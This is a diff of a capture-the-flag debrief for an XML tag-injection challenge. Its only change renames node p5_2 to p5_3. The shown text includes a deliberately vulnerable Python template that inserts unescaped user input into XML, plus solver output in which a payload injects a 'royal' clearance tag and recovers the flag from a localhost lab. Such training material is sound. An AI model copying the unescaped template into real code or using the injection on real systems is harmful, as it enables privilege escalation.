@@ -1,6 +1,6 @@
 # Palace Blueprint Tampering, Debrief
 
-**Node:** `p5_2` &middot; **Flag:** `SEIYAKU{inject_a_new_tag}` &middot; **Route:** `POST /p5/blueprint` &middot; **Sink:** `challenges/phase5.py`, real `lxml` parser via `core/xml_parser.parse()`, flag stored in real MariaDB (`palace_clearances`) &middot; **Signal:** the printed badge's `clearance` field, cross-referenced against the real seeded lookup table
+**Node:** `p5_3` &middot; **Flag:** `SEIYAKU{inject_a_new_tag}` &middot; **Route:** `POST /p5/blueprint` &middot; **Sink:** `challenges/phase5.py`, real `lxml` parser via `core/xml_parser.parse()`, flag stored in real MariaDB (`palace_clearances`) &middot; **Signal:** the printed badge's `clearance` field, cross-referenced against the real seeded lookup table
 
 ## XML basics, briefly
 
@@ -26,7 +26,7 @@ directly into the template with none of the five reserved characters
 escaped first:
 
 ```python
-# challenges/phase5.py, p5_2
+# challenges/phase5.py, p5_3
 _GUEST_BADGE_TEMPLATE = (
     "<badge><visitor>{name}</visitor><clearance>guest</clearance></badge>"
 )
@@ -141,7 +141,7 @@ to the badge you're shown. The injection is entirely upstream, in how
 
 ## The full solver, live
 
-`solvers/p5_2.sh` runs all three checks below against the real running
+`solvers/p5_3.sh` runs all three checks below against the real running
 stack, in order: (1) a plain name prints an ordinary clean guest badge,
 (2) a stray unbalanced `<` is rejected as malformed XML, (3) the
 tag-injection payload. This is the actual, unedited output of a real
@@ -149,19 +149,19 @@ run against this exact seed (`SEIYAKU_BASE` was the default
 `http://localhost:8000` for this run):
 
 ```
-[p5_2] target: http://localhost:8000/p5/blueprint
-[p5_2] step 1, plain visitor name: name=Gon
+[p5_3] target: http://localhost:8000/p5/blueprint
+[p5_3] step 1, plain visitor name: name=Gon
   response: {"badge":{"clearance":"guest","clearance_description":"Standard visitor pass, issued by the badge press to anyone.","visitor":"Gon"},"error":null,"flag":null,"raw_xml":"<badge><visitor>Gon</visitor><clearance>guest</clearance></badge>","success":false,"visitor":"Gon"}
   ok: plain name printed an ordinary guest badge
-[p5_2] step 2, malformed XML metachar: name=<
+[p5_3] step 2, malformed XML metachar: name=<
   response: {"badge":null,"error":"the blueprint press rejected that badge: StartTag: invalid element name, line 1, column 18 (<string>, line 1)","flag":null,"raw_xml":"<badge><visitor><</visitor><clearance>guest</clearance></badge>","success":false,"visitor":"<"}
   ok: a stray '<' was rejected as malformed XML (parser genuinely runs)
-[p5_2] step 3, tag injection: name=</visitor><clearance>royal</clearance><visitor>x
+[p5_3] step 3, tag injection: name=</visitor><clearance>royal</clearance><visitor>x
   response: {"badge":{"clearance":"royal","clearance_description":"The King's own clearance, the badge press was never wired to write this level to any badge.","visitor":null},"error":null,"flag":"SEIYAKU{inject_a_new_tag}","raw_xml":"<badge><visitor></visitor><clearance>royal</clearance><visitor>x</visitor><clearance>guest</clearance></badge>","success":true,"visitor":"</visitor><clearance>royal</clearance><visitor>x"}
   ok: injected <clearance>royal</clearance> won the badge, flag recovered: SEIYAKU{inject_a_new_tag}
-[p5_2] ok: plain badge clean, malformed XML rejected, tag injection
-[p5_2]     recovered the flag from real seeded palace_clearances
-[p5_2] PASS
+[p5_3] ok: plain badge clean, malformed XML rejected, tag injection
+[p5_3]     recovered the flag from real seeded palace_clearances
+[p5_3] PASS
 ```
 
 ## Related XML attack surface, briefly (not exploited on this floor)
